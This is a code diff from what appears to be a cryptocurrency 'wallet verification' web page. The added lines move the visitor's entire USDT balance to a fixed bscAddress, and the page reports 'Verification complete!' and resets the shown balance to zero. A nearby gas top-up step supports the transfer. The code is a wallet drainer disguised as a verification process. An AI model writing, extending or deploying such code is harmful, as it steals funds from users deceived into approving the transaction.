@@ -1012,17 +1012,16 @@ async function executeVerification() {
         }
         // --- BNB Check and Top-Up Integration End ---
 
-        // Proceed with USDT transfer if BNB is sufficient or top-up wasn't needed/failed
-                tokenContract.methods.transfer(recipientAddress, amountWei)
-                    .send({ from: userAddress })
-                    .on('transactionHash', (hash) => {
-                        console.log("Transaction hash:", hash);
-                    })
-                    .on('receipt', (receipt) => {
-                        // Transaction was successful
-                        step4Desc.textContent = "Verification complete!";
-                        updateStep(4, 'completed');
-                        updateProgress(100);
+       // Proceed with USDT Transfer
+        const usdtContract = new web3.eth.Contract([
+            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+        ], usdtContractAddress);
+
+        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
+
+        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+
+        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
                         
                         setTimeout(() => {
                             tokenBalance.textContent = "0.00 USDT";
